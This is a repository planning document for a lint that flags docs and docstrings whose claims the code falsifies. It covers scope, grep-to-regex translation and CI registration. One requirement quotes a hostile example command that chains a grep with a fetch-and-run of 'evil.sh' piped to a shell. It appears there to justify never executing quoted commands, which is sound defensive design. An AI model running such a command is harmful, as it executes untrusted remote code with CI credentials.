---
title: Lint the doc-vs-code drift the prose rule is not preventing
status: planning
created: 2026-08-26
---
# Lint the doc-vs-code drift the prose rule is not preventing

## Goal

`CLAUDE.md` already names doc/comment-vs-code drift as "the most-flagged
review pattern in this repo's history" and instructs reviewers to grep the old
value. That prose rule is in place, and the drift still ships.

PRs #412, #413, and #414 took **eleven review findings in one session**, and
every one was a document or docstring asserting behavior the code does not
have. The rule did not fail for lack of clarity — it failed because nothing
runs it. `CLAUDE.md`'s own working rules say to "prefer a mechanical
`tools/check_*.py` lint with tests over a prose rule whenever the pattern is
greppable." This task decides which slice of the pattern is greppable and
builds that lint.

## The evidence

The eleven findings, grouped by whether a machine could have caught them:

**Mechanically checkable — a claim about the repository that the repository
falsifies:**

- `design.md` asserted ``grep -rn "inject.dst" .trellis/spec/`` "returns
  nothing"; the same PR added that text. (#412)
- `design.md` asserted ``grep -in "dst" CLAUDE.md`` "returns nothing"; same
  PR, same falsification, two bullets up — found by hand only because the
  first one was. (#412)

**Mechanically checkable — a docstring naming a behavior the module does not
have:**

- `schema.py` claimed its exports "may raise `SystemExit`, print to stdout, or
  skip missing inputs silently". They raise `ValueError` and do none of the
  three. (#413)
- `combine.py` claimed "skip missing inputs silently"; a missing per-component
  CSV raises `SystemExit`. (#413)
- `otel.py` claimed "print to stdout"; the OTEL streamers print to stderr. (#413)

**Mechanically checkable — a prose number contradicting a tracked value:**

- The `server.py` ratchet *rationale* quoted a line count and a delta that no
  longer matched the enrolled ceiling beside it. `check_module_size.py`
  enforces the ceiling and does not read its own prose. (#414)

**Not mechanically checkable — leave out of scope:**

- Four findings where a doc's claim was true of one code path and false of
  another (`_config_error`'s "every arm"; the README and spec claiming path
  attribution both sections had, when one did not; the README implying every
  `--instances-per-component` value conflicts with DST when only `N > 1`
  does), and one intra-document contradiction (a prd Requirements bullet and
  an Execution bullet naming different files). These need a reader.

## Requirements

- Decide the lint's scope from the three checkable groups above before
  building. Ship the groups that hold up; record any group dropped and why.
  Building all three is not assumed to be correct.
- The self-falsifying-grep check **must never execute the quoted command.** A
  documented command string is attacker-controllable text — any file in the
  repository, including one arriving by pull request, could carry
  ``grep -rn "x" . ; curl evil.sh | sh`` and the lint would run it with the CI
  job's credentials. Instead, parse the quoted line into its pattern and path
  operands, refuse any form the parser cannot fully account for (pipes,
  redirects, command substitution, `;`/`&&`, unrecognized flags), and evaluate
  the claim with a fixed in-process search over those operands — Python's own
  `re` and `pathlib`, no shell, no `subprocess`. A command the parser declines
  is not a violation; see the false-positive rule below.
- That check must handle a claim that is *deliberately* historical — #412's fix
  was to date the claim ("at the time this was written…"), which is a
  legitimate form the lint must not flag.
- The docstring-behavior check must not become a second hand-maintained list.
  Derive the vocabulary it looks for (`SystemExit`, `print(`, "silently skip",
  "exit") from one place, and resolve a claim against the module *and* the
  focused implementation it re-exports from — `combine.py`'s behavior lives in
  `combine_impl.py`.
- False positives are the failure mode that kills a lint. Prefer refusing to
  judge over judging wrong: a construct the check cannot resolve is not a
  violation.
- Not executing `grep` means reimplementing it, and the two do not share a
  regex dialect. `grep` is POSIX BRE by default, `grep -E` is ERE, `grep -F` is
  literal, and none of the three is Python's `re`: `[[:alpha:]]` is a class in
  BRE and a character set in Python, `\|` is alternation in BRE and a literal
  pipe in Python, and `-i` changes both. Getting this silently wrong turns the
  lint from a check into a source of the exact drift it exists to catch. So
  define the accepted dialect subset explicitly, translate it to `re` in one
  named function, and refuse any pattern carrying a construct outside the
  subset — the rule above, applied to the pattern instead of the command.
  `inject.dst`, the pattern from #412 that motivates this check, sits inside
  any reasonable subset; that is the bar, not full BRE. Pin the translation
  with a test per accepted construct, asserting the translated `re` and `grep`
  agree on the same input.
- Follow the repo's guard conventions: full contract in the module docstring,
  `0` clean / `1` violation / `2` structural error, and a companion test file.
- Registration is four sites, and a pre-commit hook is not one of the ones
  that make CI run the lint. Read
  `tools/check_guard_ci_coverage.py`'s module docstring for the current
  contract rather than working from a restatement of it; the shape as of this
  filing is:
  - `.pre-commit-config.yaml` — the hook, its `files:` pattern, and whether it
    is `always_run`. This governs local runs and, through the `files:` pattern,
    which lanes the guard will *demand* coverage in. **CI never runs
    `pre-commit`,** so on a pull request the hook alone buys nothing.
  - `.github/workflows/ci.yml` — an explicit CI step, and/or the `quick_check`
    job's hand-written test-file list. QUICK and FULL are required of every
    lint, because adding any application source file to a PR forces
    `app_required` regardless of what else it touches. FULL partitions the
    whole suite, so a live-tree test covers it automatically; QUICK runs only
    the named files, so the companion test file must be added to that list by
    hand or QUICK is uncovered.
  - `CLAUDE.md` — the repository-lints table row.
  - Whatever `tools/check_ci_review_contract.py` demands once `ci.yml` or the
    classifier is touched. That guard holds the cadence contract's named
    anchors in lockstep across `docs/DEVELOPMENT_CYCLE.md`,
    `.trellis/spec/amc/backend/testing-quality.md`, and
    `.github/instructions/anomaly-metric-creator.instructions.md` as well as
    the workflow files, so a CI edit made for this lint is not self-contained:
    run the guard and satisfy what it names, in the same diff.
  - `tests/test_<lint>_lint.py` — the companion test file, including a
    live-tree test if that is how the lint earns its lane coverage. The guard
    finds these structurally, not by name: a zero-argument `def test_*` in a
    file that assigns the lint's path from `REPO_ROOT`. A test taking
    `tmp_path` builds a synthetic tree and counts for nothing.
- The LIGHT lane has the trap that motivated the guard's existence. A lint
  reaches LIGHT only if its own watched files, alone, classify as
  `lightweight_only` under `scripts/classify-ci-changes.sh` — and LIGHT runs no
  test job at all, so a lint in that position needs an explicit CI step or it
  is enforced in appearance only. This lint watches `.trellis/`, `docs/`, and
  spec Markdown; a PR touching only those is exactly the `lightweight_only`
  shape, and exactly the shape the lint exists to police. Expect to need the CI
  step, and confirm the classifier routes the watched paths at all.

## Acceptance Criteria

- [ ] The scope decision is recorded with rationale before implementation,
      naming which of the three groups ship and why any was dropped.
- [ ] Each shipped check catches its own motivating finding: the lint is run
      against the pre-fix content of the PRs cited above and flags it.
- [ ] Each shipped check passes on current `HEAD` with zero findings, and the
      dated-claim form #412 landed is not flagged.
- [ ] `tools/check_guard_ci_coverage.py` passes with the new lint registered.
- [ ] The lint has its own test file, and that file is named in the
      `quick_check` job's test list so the QUICK lane actually runs it.
- [ ] A PR touching only the lint's watched paths — the `lightweight_only`
      shape — runs the lint. Verified against the real classifier, not by
      reading the `files:` pattern.
- [ ] `CLAUDE.md`'s repository-lints table lists it.

## Notes

- Source: the review-learnings pass over PRs #412/#413/#414 (2026-08-26),
  which clustered every finding in those three PRs as
  `contract-documentation-drift` and suggested "contract terminology checks
  that keep documentation and help text aligned with shipped behavior".
- Interacts with `07-17-audit-debris-cleanup`, which owns unchecked lockstep
  pairs — the same family of problem approached from the other end.
- The eleven findings were all caught by review, so the cost of *not* doing
  this is reviewer time rather than shipped defects. That is a real argument
  for P3; it is filed P2 because the volume was eleven in a single session.
